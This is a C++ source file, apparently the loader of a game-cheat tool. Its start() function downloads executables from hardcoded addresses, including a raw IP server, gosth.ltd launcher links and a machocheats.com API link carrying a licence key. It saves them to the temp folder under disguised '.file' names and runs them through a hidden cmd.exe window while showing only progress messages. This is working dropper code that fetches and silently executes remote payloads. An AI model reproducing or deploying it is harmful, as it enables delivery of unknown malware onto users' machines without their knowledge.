#include "injections.h"
#include <windows.h>
#include <urlmon.h>
#include <shellapi.h>
#include <string>

#pragma comment(lib, "urlmon.lib")

// External variables from nfggggg.cpp
extern char g_statusMessage[256];
extern float g_progressValue;
extern bool g_showSpinner;

namespace inject {

    // Helper function to download and execute files
    void start(const char* url, const char* filename) {
        lstrcpynA(g_statusMessage, "Connecting...", sizeof(g_statusMessage));
        g_progressValue = 0.1f;
        Sleep(200);

        char tempPath[MAX_PATH];
        if (GetTempPathA(MAX_PATH, tempPath) == 0) {
            lstrcpynA(g_statusMessage, "Failed - No temp path", sizeof(g_statusMessage));
            g_progressValue = 0.0f;
            g_showSpinner = false;
            Sleep(2000);
            lstrcpynA(g_statusMessage, "Ready", sizeof(g_statusMessage));
            return;
        }

        std::string tempFile = std::string(tempPath) + filename;
        DeleteFileA(tempFile.c_str());

        lstrcpynA(g_statusMessage, "Downloading...", sizeof(g_statusMessage));
        g_progressValue = 0.3f;

        HRESULT downloadResult = URLDownloadToFileA(NULL, url, tempFile.c_str(), 0, NULL);

        if (downloadResult == S_OK) {
            g_progressValue = 0.7f;
            Sleep(300);

            DWORD fileAttributes = GetFileAttributesA(tempFile.c_str());
            if (fileAttributes == INVALID_FILE_ATTRIBUTES) {
                lstrcpynA(g_statusMessage, "File not found", sizeof(g_statusMessage));
                g_progressValue = 0.0f;
                g_showSpinner = false;
                return;
            }

            lstrcpynA(g_statusMessage, "Executing...", sizeof(g_statusMessage));
            g_progressValue = 0.9f;

            // Execute .file through cmd.exe (required for non-standard extensions)
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi = { 0 };
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;

            // Build command: cmd.exe /c "path\to\file.file"
            std::string cmdLine = "cmd.exe /c \"\"" + tempFile + "\"\"";

            if (CreateProcessA(
                NULL,                           // lpApplicationName
                (LPSTR)cmdLine.c_str(),        // lpCommandLine - cmd.exe /c executes the file
                NULL, NULL, FALSE,
                CREATE_NO_WINDOW,               // Hide the CMD window
                NULL, NULL,
                &si, &pi)) {

                // Wait a moment to see if process starts successfully
                DWORD waitResult = WaitForSingleObject(pi.hProcess, 1000); // Wait 1 second

                if (waitResult == WAIT_TIMEOUT) {
                    // Process is still running - good!
                    lstrcpynA(g_statusMessage, "Running successfully", sizeof(g_statusMessage));
                    g_progressValue = 1.0f;
                } else {
                    // Process exited quickly - check exit code
                    DWORD exitCode = 0;
                    GetExitCodeProcess(pi.hProcess, &exitCode);
                    wsprintfA(g_statusMessage, "Process exited - Code: %lu", exitCode);
                    g_progressValue = 0.5f;
                    Sleep(3000);
                }

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else {
                // If direct execution fails, show error code
                DWORD error = GetLastError();
                wsprintfA(g_statusMessage, "Failed to execute - Error: %lu", error);
                g_progressValue = 0.0f;
                Sleep(3000); // Show error for 3 seconds
            }
        }
        else {
            lstrcpynA(g_statusMessage, "Server unreachable", sizeof(g_statusMessage));
            g_progressValue = 0.0f;
            Sleep(2500);
            lstrcpynA(g_statusMessage, "Ready", sizeof(g_statusMessage));
        }

        Sleep(1000);
        lstrcpynA(g_statusMessage, "Ready", sizeof(g_statusMessage));
        g_progressValue = 0.0f;
        g_showSpinner = false;
    }

    // TZ Project injection
    void tz() {
        start("http://151.242.59.158:3000/tzzzzdPTUf9ofPZ.tmp", "nowifoundanothercrush.file");
    }

    // TZX Extended injection
    void tzx() {
        start("http://151.242.59.158:3000/kvnhrt.tmp", "tzx_temp.file");
    }

    // GHOST injection
    void ghost() {
        start("https://s3-us.gosth.ltd/launcher.exe", "heycardsifufoundthisiamfucked.file");
    }

    // Keyser injection
    void keyser() {
        start("http://151.242.59.158:3000/krejzac.tmp", "ahfakghuih.file");
    }

    // Goath injection
    void goath() {
        start("https://cdn.gosth.ltd/launcher.exe", "skjgsafg.file");
    }

    // Macho injection
    void macho() {
        start("https://machocheats.com/phpbackend/webapi.php?request=GetDownloadLink&key=MACHO-FIVEM-DAPBK-DXPET", "ilovevwieners.file");
    }

} // namespace inject
